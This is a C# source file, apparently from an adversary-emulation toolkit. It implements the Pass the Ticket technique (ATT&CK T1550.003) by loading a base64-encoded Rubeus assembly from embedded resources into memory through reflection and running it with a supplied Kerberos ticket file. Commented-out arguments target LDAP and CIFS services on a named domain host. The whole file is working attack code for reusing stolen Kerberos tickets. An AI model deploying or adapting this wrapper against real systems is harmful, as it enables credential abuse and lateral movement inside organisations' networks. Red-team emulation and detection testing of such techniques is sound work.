using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Threading;

class Technique
{
	/*
		T1550-003 (Use Alternate Authentication Material: Pass the Ticket).

		first parameter - Ticket File - "C:\\Users\\Public\\ticket.kirbi" 

    */

	public static Dictionary<string, string> EntryData { get; set; }
	public static Dictionary<string, string> ExitData { get; set; }

	public static bool Inject(byte[] bytes, string[] techniqueParams)
	{
		try
		{

			var assembly = System.Reflection.Assembly.Load(bytes);

			Type t = assembly.GetType("Rubeus.Program");

			object o = Activator.CreateInstance(t);
			object[] args = new object[] { techniqueParams };
			t.GetMethod("Main").Invoke(o, args);

			Console.WriteLine("Executed technique with success.");
			return true;

		}
		catch (Exception ex)
		{
			Console.WriteLine("Could not execute technique.");

			Console.WriteLine("Error injecting code ({0})", ex.Message, "alert");
		}
		return false;
	}

	public static bool execCommand(string[] args)
	{
		try
		{
			string converted = Encoding.UTF8.GetString(T1550_003.Properties.Resources.ruru, 0, T1550_003.Properties.Resources.ruru.Length);

			Inject(Convert.FromBase64String(converted), args);

			return true;
		}
		catch (Exception)
		{
			throw;
		}
	}

	public static void Main(string[] args)
	{
		Console.WriteLine("[T1550-003] Starting Execution!");
		Console.WriteLine("[T1550-003] Passing the ticket with the "+args[0]+" ticket file.");
		//string[] arguments = {"ptt", "/ticket:"+args[0]};
		//string[] arguments = {"asktgs", "/ticket:"+args[0], "/service:LDAP/w2k8s-21.interbanco.com.py,cifs/w2k8s-21.interbanco.com.py", "/ptt"};

		if (execCommand(args)){
			Console.WriteLine("[T1550-003] Successfully executed Technique (return 0)! ");
		}
		else
		{
			Console.WriteLine("[T1550-003] Oops, something went wrong! ");
		}
	}
}